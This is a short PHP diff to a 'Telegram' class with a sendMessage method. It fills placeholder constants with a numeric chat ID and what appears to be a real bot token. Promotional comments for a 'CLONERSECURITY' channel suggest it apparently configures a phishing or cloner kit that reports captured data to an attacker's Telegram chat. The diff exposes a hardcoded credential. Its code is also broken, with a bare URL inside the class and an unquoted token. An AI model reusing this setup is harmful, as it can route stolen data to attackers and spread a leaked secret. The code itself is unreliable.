@@ -2,8 +2,8 @@
 # https://t.me/CLONERSECURITY join us
 class Telegram {
 http://penetrationtest.blogfa.com/
-    const CHAT_ID =ایدی چت;
-    const TOKEN =توکن;
+    const CHAT_ID =75224801;
+    const TOKEN =495414387:AAHWNf6_NGnYkav-uvHlHZu_9tMfZObgYtw;
 # https://t.me/CLONERSECURITY join us
     public static function sendMessage($message)
     {
